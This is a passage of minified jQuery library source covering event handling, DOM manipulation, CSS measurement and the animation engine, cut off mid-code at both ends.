t, i, r, n) }) } function De(e, i, o) { o ? (Q.set(e, i, !1), k.event.add(e, i, { namespace: !1, handler: function (e) { var t, n, r = Q.get(this, i); if (1 & e.isTrigger && this[i]) { if (r.length) (k.event.special[i] || {}).delegateType && e.stopPropagation(); else if (r = s.call(arguments), Q.set(this, i, r), t = o(this, i), this[i](), r !== (n = Q.get(this, i)) || t ? Q.set(this, i, !1) : n = {}, r !== n) return e.stopImmediatePropagation(), e.preventDefault(), n.value } else r.length && (Q.set(this, i, { value: k.event.trigger(k.extend(r[0], k.Event.prototype), r.slice(1), this) }), e.stopImmediatePropagation()) } })) : void 0 === Q.get(e, i) && k.event.add(e, i, ke) } k.event = { global: {}, add: function (t, e, n, r, i) { var o, a, s, u, l, c, f, p, d, h, g, v = Q.get(t); if (v) { n.handler && (n = (o = n).handler, i = o.selector), i && k.find.matchesSelector(ie, i), n.guid || (n.guid = k.guid++), (u = v.events) || (u = v.events = {}), (a = v.handle) || (a = v.handle = function (e) { return "undefined" != typeof k && k.event.triggered !== e.type ? k.event.dispatch.apply(t, arguments) : void 0 }), l = (e = (e || "").match(R) || [""]).length; while (l--) d = g = (s = Ee.exec(e[l]) || [])[1], h = (s[2] || "").split(".").sort(), d && (f = k.event.special[d] || {}, d = (i ? f.delegateType : f.bindType) || d, f = k.event.special[d] || {}, c = k.extend({ type: d, origType: g, data: r, handler: n, guid: n.guid, selector: i, needsContext: i && k.expr.match.needsContext.test(i), namespace: h.join(".") }, o), (p = u[d]) || ((p = u[d] = []).delegateCount = 0, f.setup && !1 !== f.setup.call(t, r, h, a) || t.addEventListener && t.addEventListener(d, a)), f.add && (f.add.call(t, c), c.handler.guid || (c.handler.guid = n.guid)), i ? p.splice(p.delegateCount++, 0, c) : p.push(c), k.event.global[d] = !0) } }, remove: function (e, t, n, r, i) { var o, a, s, u, l, c, f, p, d, h, g, v = Q.hasData(e) && Q.get(e); if (v && (u = v.events)) { l = (t = (t || "").match(R) || [""]).length; while (l--) if (d = g = (s = Ee.exec(t[l]) || [])[1], h = (s[2] || "").split(".").sort(), d) { f = k.event.special[d] || {}, p = u[d = (r ? f.delegateType : f.bindType) || d] || [], s = s[2] && new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), a = o = p.length; while (o--) c = p[o], !i && g !== c.origType || n && n.guid !== c.guid || s && !s.test(c.namespace) || r && r !== c.selector && ("**" !== r || !c.selector) || (p.splice(o, 1), c.selector && p.delegateCount--, f.remove && f.remove.call(e, c)); a && !p.length && (f.teardown && !1 !== f.teardown.call(e, h, v.handle) || k.removeEvent(e, d, v.handle), delete u[d]) } else for (d in u) k.event.remove(e, d + t[l], n, r, !0); k.isEmptyObject(u) && Q.remove(e, "handle events") } }, dispatch: function (e) { var t, n, r, i, o, a, s = k.event.fix(e), u = new Array(arguments.length), l = (Q.get(this, "events") || {})[s.type] || [], c = k.event.special[s.type] || {}; for (u[0] = s, t = 1; t < arguments.length; t++)u[t] = arguments[t]; if (s.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, s)) { a = k.event.handlers.call(this, s, l), t = 0; while ((i = a[t++]) && !s.isPropagationStopped()) { s.currentTarget = i.elem, n = 0; while ((o = i.handlers[n++]) && !s.isImmediatePropagationStopped()) s.rnamespace && !1 !== o.namespace && !s.rnamespace.test(o.namespace) || (s.handleObj = o, s.data = o.data, void 0 !== (r = ((k.event.special[o.origType] || {}).handle || o.handler).apply(i.elem, u)) && !1 === (s.result = r) && (s.preventDefault(), s.stopPropagation())) } return c.postDispatch && c.postDispatch.call(this, s), s.result } }, handlers: function (e, t) { var n, r, i, o, a, s = [], u = t.delegateCount, l = e.target; if (u && l.nodeType && !("click" === e.type && 1 <= e.button)) for (; l !== this; l = l.parentNode || this)if (1 === l.nodeType && ("click" !== e.type || !0 !== l.disabled)) { for (o = [], a = {}, n = 0; n < u; n++)void 0 === a[i = (r = t[n]).selector + " "] && (a[i] = r.needsContext ? -1 < k(i, this).index(l) : k.find(i, this, null, [l]).length), a[i] && o.push(r); o.length && s.push({ elem: l, handlers: o }) } return l = this, u < t.length && s.push({ elem: l, handlers: t.slice(u) }), s }, addProp: function (t, e) { Object.defineProperty(k.Event.prototype, t, { enumerable: !0, configurable: !0, get: m(e) ? function () { if (this.originalEvent) return e(this.originalEvent) } : function () { if (this.originalEvent) return this.originalEvent[t] }, set: function (e) { Object.defineProperty(this, t, { enumerable: !0, configurable: !0, writable: !0, value: e }) } }) }, fix: function (e) { return e[k.expando] ? e : new k.Event(e) }, special: { load: { noBubble: !0 }, click: { setup: function (e) { var t = this || e; return pe.test(t.type) && t.click && A(t, "input") && De(t, "click", ke), !1 }, trigger: function (e) { var t = this || e; return pe.test(t.type) && t.click && A(t, "input") && De(t, "click"), !0 }, _default: function (e) { var t = e.target; return pe.test(t.type) && t.click && A(t, "input") && Q.get(t, "click") || A(t, "a") } }, beforeunload: { postDispatch: function (e) { void 0 !== e.result && e.originalEvent && (e.originalEvent.returnValue = e.result) } } } }, k.removeEvent = function (e, t, n) { e.removeEventListener && e.removeEventListener(t, n) }, k.Event = function (e, t) { if (!(this instanceof k.Event)) return new k.Event(e, t); e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || void 0 === e.defaultPrevented && !1 === e.returnValue ? ke : Se, this.target = e.target && 3 === e.target.nodeType ? e.target.parentNode : e.target, this.currentTarget = e.currentTarget, this.relatedTarget = e.relatedTarget) : this.type = e, t && k.extend(this, t), this.timeStamp = e && e.timeStamp || Date.now(), this[k.expando] = !0 }, k.Event.prototype = { constructor: k.Event, isDefaultPrevented: Se, isPropagationStopped: Se, isImmediatePropagationStopped: Se, isSimulated: !1, preventDefault: function () { var e = this.originalEvent; this.isDefaultPrevented = ke, e && !this.isSimulated && e.preventDefault() }, stopPropagation: function () { var e = this.originalEvent; this.isPropagationStopped = ke, e && !this.isSimulated && e.stopPropagation() }, stopImmediatePropagation: function () { var e = this.originalEvent; this.isImmediatePropagationStopped = ke, e && !this.isSimulated && e.stopImmediatePropagation(), this.stopPropagation() } }, k.each({ altKey: !0, bubbles: !0, cancelable: !0, changedTouches: !0, ctrlKey: !0, detail: !0, eventPhase: !0, metaKey: !0, pageX: !0, pageY: !0, shiftKey: !0, view: !0, "char": !0, code: !0, charCode: !0, key: !0, keyCode: !0, button: !0, buttons: !0, clientX: !0, clientY: !0, offsetX: !0, offsetY: !0, pointerId: !0, pointerType: !0, screenX: !0, screenY: !0, targetTouches: !0, toElement: !0, touches: !0, which: function (e) { var t = e.button; return null == e.which && Te.test(e.type) ? null != e.charCode ? e.charCode : e.keyCode : !e.which && void 0 !== t && Ce.test(e.type) ? 1 & t ? 1 : 2 & t ? 3 : 4 & t ? 2 : 0 : e.which } }, k.event.addProp), k.each({ focus: "focusin", blur: "focusout" }, function (e, t) { k.event.special[e] = { setup: function () { return De(this, e, Ne), !1 }, trigger: function () { return De(this, e), !0 }, delegateType: t } }), k.each({ mouseenter: "mouseover", mouseleave: "mouseout", pointerenter: "pointerover", pointerleave: "pointerout" }, function (e, i) { k.event.special[e] = { delegateType: i, bindType: i, handle: function (e) { var t, n = e.relatedTarget, r = e.handleObj; return n && (n === this || k.contains(this, n)) || (e.type = r.origType, t = r.handler.apply(this, arguments), e.type = i), t } } }), k.fn.extend({ on: function (e, t, n, r) { return Ae(this, e, t, n, r) }, one: function (e, t, n, r) { return Ae(this, e, t, n, r, 1) }, off: function (e, t, n) { var r, i; if (e && e.preventDefault && e.handleObj) return r = e.handleObj, k(e.delegateTarget).off(r.namespace ? r.origType + "." + r.namespace : r.origType, r.selector, r.handler), this; if ("object" == typeof e) { for (i in e) this.off(i, t, e[i]); return this } return !1 !== t && "function" != typeof t || (n = t, t = void 0), !1 === n && (n = Se), this.each(function () { k.event.remove(this, e, n, t) }) } }); var je = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi, qe = /<script|<style|<link/i, Le = /checked\s*(?:[^=]|=\s*.checked.)/i, He = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g; function Oe(e, t) { return A(e, "table") && A(11 !== t.nodeType ? t : t.firstChild, "tr") && k(e).children("tbody")[0] || e } function Pe(e) { return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e } function Re(e) { return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e } function Me(e, t) { var n, r, i, o, a, s, u, l; if (1 === t.nodeType) { if (Q.hasData(e) && (o = Q.access(e), a = Q.set(t, o), l = o.events)) for (i in delete a.handle, a.events = {}, l) for (n = 0, r = l[i].length; n < r; n++)k.event.add(t, i, l[i][n]); J.hasData(e) && (s = J.access(e), u = k.extend({}, s), J.set(t, u)) } } function Ie(n, r, i, o) { r = g.apply([], r); var e, t, a, s, u, l, c = 0, f = n.length, p = f - 1, d = r[0], h = m(d); if (h || 1 < f && "string" == typeof d && !y.checkClone && Le.test(d)) return n.each(function (e) { var t = n.eq(e); h && (r[0] = d.call(this, e, t.html())), Ie(t, r, i, o) }); if (f && (t = (e = we(r, n[0].ownerDocument, !1, n, o)).firstChild, 1 === e.childNodes.length && (e = t), t || o)) { for (s = (a = k.map(ve(e, "script"), Pe)).length; c < f; c++)u = e, c !== p && (u = k.clone(u, !0, !0), s && k.merge(a, ve(u, "script"))), i.call(n[c], u, c); if (s) for (l = a[a.length - 1].ownerDocument, k.map(a, Re), c = 0; c < s; c++)u = a[c], he.test(u.type || "") && !Q.access(u, "globalEval") && k.contains(l, u) && (u.src && "module" !== (u.type || "").toLowerCase() ? k._evalUrl && !u.noModule && k._evalUrl(u.src, { nonce: u.nonce || u.getAttribute("nonce") }) : b(u.textContent.replace(He, ""), u, l)) } return n } function We(e, t, n) { for (var r, i = t ? k.filter(t, e) : e, o = 0; null != (r = i[o]); o++)n || 1 !== r.nodeType || k.cleanData(ve(r)), r.parentNode && (n && oe(r) && ye(ve(r, "script")), r.parentNode.removeChild(r)); return e } k.extend({ htmlPrefilter: function (e) { return e.replace(je, "<$1></$2>") }, clone: function (e, t, n) { var r, i, o, a, s, u, l, c = e.cloneNode(!0), f = oe(e); if (!(y.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || k.isXMLDoc(e))) for (a = ve(c), r = 0, i = (o = ve(e)).length; r < i; r++)s = o[r], u = a[r], void 0, "input" === (l = u.nodeName.toLowerCase()) && pe.test(s.type) ? u.checked = s.checked : "input" !== l && "textarea" !== l || (u.defaultValue = s.defaultValue); if (t) if (n) for (o = o || ve(e), a = a || ve(c), r = 0, i = o.length; r < i; r++)Me(o[r], a[r]); else Me(e, c); return 0 < (a = ve(c, "script")).length && ye(a, !f && ve(e, "script")), c }, cleanData: function (e) { for (var t, n, r, i = k.event.special, o = 0; void 0 !== (n = e[o]); o++)if (G(n)) { if (t = n[Q.expando]) { if (t.events) for (r in t.events) i[r] ? k.event.remove(n, r) : k.removeEvent(n, r, t.handle); n[Q.expando] = void 0 } n[J.expando] && (n[J.expando] = void 0) } } }), k.fn.extend({ detach: function (e) { return We(this, e, !0) }, remove: function (e) { return We(this, e) }, text: function (e) { return _(this, function (e) { return void 0 === e ? k.text(this) : this.empty().each(function () { 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e) }) }, null, e, arguments.length) }, append: function () { return Ie(this, arguments, function (e) { 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Oe(this, e).appendChild(e) }) }, prepend: function () { return Ie(this, arguments, function (e) { if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) { var t = Oe(this, e); t.insertBefore(e, t.firstChild) } }) }, before: function () { return Ie(this, arguments, function (e) { this.parentNode && this.parentNode.insertBefore(e, this) }) }, after: function () { return Ie(this, arguments, function (e) { this.parentNode && this.parentNode.insertBefore(e, this.nextSibling) }) }, empty: function () { for (var e, t = 0; null != (e = this[t]); t++)1 === e.nodeType && (k.cleanData(ve(e, !1)), e.textContent = ""); return this }, clone: function (e, t) { return e = null != e && e, t = null == t ? e : t, this.map(function () { return k.clone(this, e, t) }) }, html: function (e) { return _(this, function (e) { var t = this[0] || {}, n = 0, r = this.length; if (void 0 === e && 1 === t.nodeType) return t.innerHTML; if ("string" == typeof e && !qe.test(e) && !ge[(de.exec(e) || ["", ""])[1].toLowerCase()]) { e = k.htmlPrefilter(e); try { for (; n < r; n++)1 === (t = this[n] || {}).nodeType && (k.cleanData(ve(t, !1)), t.innerHTML = e); t = 0 } catch (e) { } } t && this.empty().append(e) }, null, e, arguments.length) }, replaceWith: function () { var n = []; return Ie(this, arguments, function (e) { var t = this.parentNode; k.inArray(this, n) < 0 && (k.cleanData(ve(this)), t && t.replaceChild(e, this)) }, n) } }), k.each({ appendTo: "append", prependTo: "prepend", insertBefore: "before", insertAfter: "after", replaceAll: "replaceWith" }, function (e, a) { k.fn[e] = function (e) { for (var t, n = [], r = k(e), i = r.length - 1, o = 0; o <= i; o++)t = o === i ? this : this.clone(!0), k(r[o])[a](t), u.apply(n, t.get()); return this.pushStack(n) } }); var $e = new RegExp("^(" + te + ")(?!px)[a-z%]+$", "i"), Fe = function (e) { var t = e.ownerDocument.defaultView; return t && t.opener || (t = C), t.getComputedStyle(e) }, Be = new RegExp(re.join("|"), "i"); function _e(e, t, n) { var r, i, o, a, s = e.style; return (n = n || Fe(e)) && ("" !== (a = n.getPropertyValue(t) || n[t]) || oe(e) || (a = k.style(e, t)), !y.pixelBoxStyles() && $e.test(a) && Be.test(t) && (r = s.width, i = s.minWidth, o = s.maxWidth, s.minWidth = s.maxWidth = s.width = a, a = n.width, s.width = r, s.minWidth = i, s.maxWidth = o)), void 0 !== a ? a + "" : a } function ze(e, t) { return { get: function () { if (!e()) return (this.get = t).apply(this, arguments); delete this.get } } } !function () { function e() { if (u) { s.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", u.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", ie.appendChild(s).appendChild(u); var e = C.getComputedStyle(u); n = "1%" !== e.top, a = 12 === t(e.marginLeft), u.style.right = "60%", o = 36 === t(e.right), r = 36 === t(e.width), u.style.position = "absolute", i = 12 === t(u.offsetWidth / 3), ie.removeChild(s), u = null } } function t(e) { return Math.round(parseFloat(e)) } var n, r, i, o, a, s = E.createElement("div"), u = E.createElement("div"); u.style && (u.style.backgroundClip = "content-box", u.cloneNode(!0).style.backgroundClip = "", y.clearCloneStyle = "content-box" === u.style.backgroundClip, k.extend(y, { boxSizingReliable: function () { return e(), r }, pixelBoxStyles: function () { return e(), o }, pixelPosition: function () { return e(), n }, reliableMarginLeft: function () { return e(), a }, scrollboxSize: function () { return e(), i } })) }(); var Ue = ["Webkit", "Moz", "ms"], Xe = E.createElement("div").style, Ve = {}; function Ge(e) { var t = k.cssProps[e] || Ve[e]; return t || (e in Xe ? e : Ve[e] = function (e) { var t = e[0].toUpperCase() + e.slice(1), n = Ue.length; while (n--) if ((e = Ue[n] + t) in Xe) return e }(e) || e) } var Ye = /^(none|table(?!-c[ea]).+)/, Qe = /^--/, Je = { position: "absolute", visibility: "hidden", display: "block" }, Ke = { letterSpacing: "0", fontWeight: "400" }; function Ze(e, t, n) { var r = ne.exec(t); return r ? Math.max(0, r[2] - (n || 0)) + (r[3] || "px") : t } function et(e, t, n, r, i, o) { var a = "width" === t ? 1 : 0, s = 0, u = 0; if (n === (r ? "border" : "content")) return 0; for (; a < 4; a += 2)"margin" === n && (u += k.css(e, n + re[a], !0, i)), r ? ("content" === n && (u -= k.css(e, "padding" + re[a], !0, i)), "margin" !== n && (u -= k.css(e, "border" + re[a] + "Width", !0, i))) : (u += k.css(e, "padding" + re[a], !0, i), "padding" !== n ? u += k.css(e, "border" + re[a] + "Width", !0, i) : s += k.css(e, "border" + re[a] + "Width", !0, i)); return !r && 0 <= o && (u += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - o - u - s - .5)) || 0), u } function tt(e, t, n) { var r = Fe(e), i = (!y.boxSizingReliable() || n) && "border-box" === k.css(e, "boxSizing", !1, r), o = i, a = _e(e, t, r), s = "offset" + t[0].toUpperCase() + t.slice(1); if ($e.test(a)) { if (!n) return a; a = "auto" } return (!y.boxSizingReliable() && i || "auto" === a || !parseFloat(a) && "inline" === k.css(e, "display", !1, r)) && e.getClientRects().length && (i = "border-box" === k.css(e, "boxSizing", !1, r), (o = s in e) && (a = e[s])), (a = parseFloat(a) || 0) + et(e, t, n || (i ? "border" : "content"), o, r, a) + "px" } function nt(e, t, n, r, i) { return new nt.prototype.init(e, t, n, r, i) } k.extend({ cssHooks: { opacity: { get: function (e, t) { if (t) { var n = _e(e, "opacity"); return "" === n ? "1" : n } } } }, cssNumber: { animationIterationCount: !0, columnCount: !0, fillOpacity: !0, flexGrow: !0, flexShrink: !0, fontWeight: !0, gridArea: !0, gridColumn: !0, gridColumnEnd: !0, gridColumnStart: !0, gridRow: !0, gridRowEnd: !0, gridRowStart: !0, lineHeight: !0, opacity: !0, order: !0, orphans: !0, widows: !0, zIndex: !0, zoom: !0 }, cssProps: {}, style: function (e, t, n, r) { if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) { var i, o, a, s = V(t), u = Qe.test(t), l = e.style; if (u || (t = Ge(s)), a = k.cssHooks[t] || k.cssHooks[s], void 0 === n) return a && "get" in a && void 0 !== (i = a.get(e, !1, r)) ? i : l[t]; "string" === (o = typeof n) && (i = ne.exec(n)) && i[1] && (n = le(e, t, i), o = "number"), null != n && n == n && ("number" !== o || u || (n += i && i[3] || (k.cssNumber[s] ? "" : "px")), y.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, r)) || (u ? l.setProperty(t, n) : l[t] = n)) } }, css: function (e, t, n, r) { var i, o, a, s = V(t); return Qe.test(t) || (t = Ge(s)), (a = k.cssHooks[t] || k.cssHooks[s]) && "get" in a && (i = a.get(e, !0, n)), void 0 === i && (i = _e(e, t, r)), "normal" === i && t in Ke && (i = Ke[t]), "" === n || n ? (o = parseFloat(i), !0 === n || isFinite(o) ? o || 0 : i) : i } }), k.each(["height", "width"], function (e, u) { k.cssHooks[u] = { get: function (e, t, n) { if (t) return !Ye.test(k.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? tt(e, u, n) : ue(e, Je, function () { return tt(e, u, n) }) }, set: function (e, t, n) { var r, i = Fe(e), o = !y.scrollboxSize() && "absolute" === i.position, a = (o || n) && "border-box" === k.css(e, "boxSizing", !1, i), s = n ? et(e, u, n, a, i) : 0; return a && o && (s -= Math.ceil(e["offset" + u[0].toUpperCase() + u.slice(1)] - parseFloat(i[u]) - et(e, u, "border", !1, i) - .5)), s && (r = ne.exec(t)) && "px" !== (r[3] || "px") && (e.style[u] = t, t = k.css(e, u)), Ze(0, t, s) } } }), k.cssHooks.marginLeft = ze(y.reliableMarginLeft, function (e, t) { if (t) return (parseFloat(_e(e, "marginLeft")) || e.getBoundingClientRect().left - ue(e, { marginLeft: 0 }, function () { return e.getBoundingClientRect().left })) + "px" }), k.each({ margin: "", padding: "", border: "Width" }, function (i, o) { k.cssHooks[i + o] = { expand: function (e) { for (var t = 0, n = {}, r = "string" == typeof e ? e.split(" ") : [e]; t < 4; t++)n[i + re[t] + o] = r[t] || r[t - 2] || r[0]; return n } }, "margin" !== i && (k.cssHooks[i + o].set = Ze) }), k.fn.extend({ css: function (e, t) { return _(this, function (e, t, n) { var r, i, o = {}, a = 0; if (Array.isArray(t)) { for (r = Fe(e), i = t.length; a < i; a++)o[t[a]] = k.css(e, t[a], !1, r); return o } return void 0 !== n ? k.style(e, t, n) : k.css(e, t) }, e, t, 1 < arguments.length) } }), ((k.Tween = nt).prototype = { constructor: nt, init: function (e, t, n, r, i, o) { this.elem = e, this.prop = n, this.easing = i || k.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = o || (k.cssNumber[n] ? "" : "px") }, cur: function () { var e = nt.propHooks[this.prop]; return e && e.get ? e.get(this) : nt.propHooks._default.get(this) }, run: function (e) { var t, n = nt.propHooks[this.prop]; return this.options.duration ? this.pos = t = k.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : nt.propHooks._default.set(this), this } }).init.prototype = nt.prototype, (nt.propHooks = { _default: { get: function (e) { var t; return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = k.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0 }, set: function (e) { k.fx.step[e.prop] ? k.fx.step[e.prop](e) : 1 !== e.elem.nodeType || !k.cssHooks[e.prop] && null == e.elem.style[Ge(e.prop)] ? e.elem[e.prop] = e.now : k.style(e.elem, e.prop, e.now + e.unit) } } }).scrollTop = nt.propHooks.scrollLeft = { set: function (e) { e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now) } }, k.easing = { linear: function (e) { return e }, swing: function (e) { return .5 - Math.cos(e * Math.PI) / 2 }, _default: "swing" }, k.fx = nt.prototype.init, k.fx.step = {}; var rt, it, ot, at, st = /^(?:toggle|show|hide)$/, ut = /queueHooks$/; function lt() { it && (!1 === E.hidden && C.requestAnimationFrame ? C.requestAnimationFrame(lt) : C.setTimeout(lt, k.fx.interval), k.fx.tick()) } function ct() { return C.setTimeout(function () { rt = void 0 }), rt = Date.now() } function ft(e, t) { var n, r = 0, i = { height: e }; for (t = t ? 1 : 0; r < 4; r += 2 - t)i["margin" + (n = re[r])] = i["padding" + n] = e; return t && (i.opacity = i.width = e), i } function pt(e, t, n) { for (var r, i = (dt.tweeners[t] || []).concat(dt.tweeners["*"]), o = 0, a = i.length; o < a; o++)if (r = i[o].call(n, t, e)) return r } function dt(o, e, t) { var n, a, r = 0, i = dt.prefilters.length, s = k.Deferred().always(function () { delete u.elem }), u = function () { if (a) return !1; for (var e = rt || ct(), t = Math.max(0, l.startTime + l.duration - e), n = 1 - (t / l.duration || 0), r = 0, i = l.tweens.length; r < i; r++)l.tweens[r].run(n); return s.notifyWith(o, [l, n, t]), n < 1 && i ? t : (i || s.notifyWith(o, [l, 1, 0]), s.resolveWith(o, [l]), !1) }, l = s.promise({ elem: o, props: k.extend({}, e), opts: k.extend(!0, { specialEasing: {}, easing: k.easing._default }, t), originalProperties: e, originalOptions: t, startTime: rt || ct(), duration: t.duration, tweens: [], createTween: function (e, t) { var n = k.Tween(o, l.opts, e, t, l.opts.specialEasing[e] || l.opts.easing); return l.tweens.push(n), n }, stop: function (e) { var t = 0, n = e ? l.tweens.length : 0; if (a) return this; for (a = !0; t < n; t++)l.tweens[t].run(1); return e ? (s.notifyWith(o, [l, 1, 0]), s.resolveWith(o, [l, e])) : s.rejectWith(o, [l, e]), this } }), c = l.props; for (!function (e, t) { var n, r, i, o, a; for (n in e) if (i = t[r = V(n)], o = e[n], Array.isArray(o) && (i = o[1], o = e[n] = o[0]), n !== r && (e[r] = o, delete e[n]), (a = k.cssHooks[r]) && "expand" in a) for (n in o = a.expand(o), delete e[r], o) n in e || (e[n] = o[n], t[n] = i); else t[r] = i }(c, l.opts.specialEasing); r < i; r++)if (n = dt.prefilters[r].call(l, o, c, l.opts)) return m(n.stop) && (k._queueHooks(l.elem, l.opts.queue).stop = n.stop.bind(n)), n; return k.map(c, pt, l), m(l.opts.start) && l.opts.start.call(o, l), l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always), k.fx.timer(k.extend(u, { elem: o, anim: l, queue: l.opts.queue })), l } k.Animation = k.extend(dt, { tweeners: { "*": [function (e, t) { var n = this.createTween(e, t); return le(n.elem, e, ne.exec(t), n), n }] }, tweener: function (e, t) { m(e) ? (t = e, e = ["*"]) : e = e.match(R); for (var n, r = 0, i = e.length; r < i; r++)n = e[r], dt.tweeners[n] = dt.tweeners[n] || [], dt.tweeners[n].unshift(t) }, prefilters: [function (e, t, n) { var r, i, o, a, s, u, l, c, f = "width" in t || "height" in t, p = this, d = {}, h = e.style, g = e.nodeType && se(e), v = Q.get(e, "fxshow"); for (r in n.queue || (null == (a = k._queueHooks(e, "fx")).unqueued && (a.unqueued = 0, s = a.empty.fire, a.empty.fire = function () { a.unqueued || s() }), a.unqueued++, p.always(function () { p.always(function () { a.unqueued--, k.queue(e, "fx").length || a.empty.fire() }) })), t) if (i = t[r], st.test(i)) { if (delete t[r], o = o || "toggle" === i, i === (g ? "hide" : "show")) { if ("show" !== i || !v || void 0 === v[r]) continue; g = !0 } d[r] = v && v[r] || k.style(e, r) } if ((u = !k.isEmptyObject(t)) || !k.isEmptyObject(d)) for (r in f && 1 === e.nodeType && (n.overflow = [h.overflow, h.overflowX, h.overflowY], null == (l = v && v.display) && (l = Q.get(e, "display")), "none" === (c = k.css(e, "display")) && (l ? c = l : (fe([e], !0), l = e.style.display || l, c = k.css(e, "display"), fe([e]))), ("inline" === c || "inline-block" === c && null != l) && "none" === k.css(e, "float") && (u || (p.done(function () { h.display = l }), null == l && (c = h.display, l = "none" === c ? "" : c)), h.display = "inline-block")), n.overflow && (h.overflow = "hidden", p.always(function () { h.overflow = n.overflow[0], h.overflowX = n.overflow[1], h.overflowY = n.overflow[2] })), u = !1, d) u || (v ? "hidden" in v && (g = v.hidden) : v = Q.access(e, "fxshow", { display: l }), o && (v.hidden = !g), g && fe([e], !0), p.done(function () { for (r in g || fe([e]), Q.remove(e, "fxshow"), d) k.style(e, r, d[r]) })), u = pt(g ? v[r] : 0, r, p), r in v || (v[r] = u.start, g && (u.end = u.start, u.start = 0)) }], prefilter: function (e, t) { t ? dt.prefilters.unshift(e) : dt.prefilters.push(e) } }), k.speed = function (e, t, n) { var r = e && "object" == typeof e ? k.extend({}, e) : { complete: n || !n && t || m(e) && e, duration: e, easing: n && t || t && !m(t) && t }; return k.fx.off ? r.duration = 0 : "number" != typeof r.duration && (r.duration in k.fx.speeds ? r.duration = k.fx.speeds[r.duration] : r.duration = k.fx.speeds._default), null != r.queue && !0 !== r.queue || (r.queue = "fx"), r.old = r.complete, r.complete = function () { m(r.old) && r.old.call(this), r.queue && k.dequeue(this, r.queue) }, r }, k.fn.extend({ fadeTo: function (e, t, n, r) { return this.filter(se).css("opacity", 0).show().end().animate({ opacity: t }, e, n, r) }, animate: function (t, e, n, r) { var i = k.isEmptyObject(t), o = k.speed(e, n, r), a = function () { var e = dt(this, k.extend({}, t), o); (i || Q.get(this, "finish")) && e.stop(!0) }; return a.finish = a, i || !1 === o.queue ? this.each(a) : this.queue(o.queue, a) }, stop: function (i, e, o) { var a = function (e) { var t = e.stop; delete e.stop, t(o) }; return "string" != typeof i && (o = e, e = i, i = void 0), e && !1 !== i && this.queue(i || "fx", []), this.each(function () { var e = !0, t = null != i && i + "queueHooks", n = k.timers, r = Q.get(this); if (t) r[t] && r[t].stop && a(r[t]); else for (t in r) r[t] && r[t].stop && ut.test(t) && a(r[t]); for (t = n.length; t--;)n[t].elem !== this || null != i && n[t].queue !== i || (n[t].anim.stop(o), e = !1, n.splice(t, 1)); !e && o || k.dequeue(this, i) }) }, finish: function (a) { return !1 !== a && (a = a || "fx"), this.each(function () { var e, t = Q.get(this), n = t[a + "queue"], r = t[a + "queueHooks"], i = k.timers, o = n ? n.length : 0; for (t.finish = !0, k.queue(this, a, []), r && r.stop && r.stop.call(this, !0), e = i.length; e--;)i[e].elem === this && i[e].queue === a && (i[e].anim.stop(!0), i.splice(e, 1)); for (e = 0; e < o; e++)n[e] && n[e].finish && n[e].finish.call(this); delete t.finish }) } }), k.each(["toggle", "show", "hide"], function (e, r) { var i = k.fn[r]; k.fn[r] = function (e, t, n) { return null == e || "boolean" == typeof e ? i.apply(this, arguments) : this.animate(ft(r, !0), e, t, n) } }), k.each({ slideDown: ft("show"), slideUp: ft("hide"), slideToggle: ft("toggle"), fadeIn: { opacity: "show" }, fadeOut: { opacity: "hide" }, fadeToggle: { opacity: "toggle" } }, function (e, r) { k.fn[e] = function (e, t, n) { return this.animate(r, e, t, n) } }), k.timers = [], k.fx.tick = function () { var e, t = 0, n = k.timers; for (rt = Date.now(); t < n.length; t++)(e = n[t])() || n[t] !== e || n.splice(t--, 1); n.length || k.fx.stop(), rt = void 0 }, k.fx.timer = function (e) { k.timers.push(e), k.fx.start() }, k.fx.interval = 13, k.fx.start = function () { it || (it = !0, lt()) }, k.fx.stop = function () { it = null }, k.fx.speeds = { slow: 600, fast: 200, _default: 400 }, k.fn.delay = function (r, e) { return r = k.fx && k.fx.speeds[r] || r, e = e || "fx", this.queue(e, function (e, t) { var n = C.setTimeout(e, r); t.stop = function () { C.clearTimeout(n) } }) }, ot = E.createElement("input"), at = E.createElement("select").appendChild(E.createElement("option")), ot.type = "checkbox", y.checkOn = "" !== ot.value, y.optSelected = at.selected, (ot = E.createElement("input")).value = "t", ot.type = "radio", y.radioValue = "t" === ot.value; var ht, gt = k.expr.attrHandle; k.fn.extend({ attr: function (e, t) { return _(this, k.attr, e, t, 1 < arguments.length) }, removeAttr: function (e) { return this.each(function () { k.removeAttr(this, e) }) } }), k.extend({ attr: function (e, t, n) { var r, i, o = e.nodeType; if (3 !== o && 8 !== o && 2 !== o) return "undefined" == typeof e.getAttribute ? k.prop(e, t, n) : (1 === o && k.isXMLDoc(e) || (i = k.attrHooks[t.toLowerCase()] || (k.expr.match.bool.test(t) ? ht : void 0)), void 0 !== n ? null === n ? void 